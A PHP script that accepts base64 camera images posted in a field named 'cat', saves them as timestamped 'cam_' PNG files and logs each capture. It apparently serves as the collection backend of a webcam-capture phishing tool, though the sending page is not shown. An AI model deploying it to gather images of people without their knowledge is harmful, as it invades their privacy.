<?php

$date = date('Y-m-d H:i:s');
$dateFile = date('dMYHis');
$imageData = $_POST['cat'] ?? '';

if (!empty($imageData)) {
    // Parse base64 image data
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);
    
    if ($unencodedData) {
        // Save image file
        $filename = 'cam_' . $dateFile . '.png';
        $fp = fopen($filename, 'wb');
        if ($fp) {
            fwrite($fp, $unencodedData);
            fclose($fp);
            
            // Create structured log entry
            $log_entry = "=" . str_repeat("=", 70) . "\n";
            $log_entry .= "[" . $date . "] Camera Capture Received\n";
            $log_entry .= "FILE: " . $filename . "\n";
            $log_entry .= "SIZE: " . strlen($unencodedData) . " bytes\n";
            $log_entry .= "STATUS: SUCCESS\n";
            $log_entry .= "=" . str_repeat("=", 70) . "\n\n";
            
            // Write to log file
            file_put_contents('Log.log', $log_entry, FILE_APPEND);
            
            // Create JSON log for tracking
            $json_file = 'captures.json';
            $json_entry = [
                'timestamp' => $date,
                'filename' => $filename,
                'size_bytes' => strlen($unencodedData),
                'status' => 'success'
            ];
            
            $existing = [];
            if (file_exists($json_file)) {
                $json_content = file_get_contents($json_file);
                $existing = json_decode($json_content, true) ?? [];
            }
            $existing[] = $json_entry;
            file_put_contents($json_file, json_encode($existing, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
        }
    }
}

exit();

?>

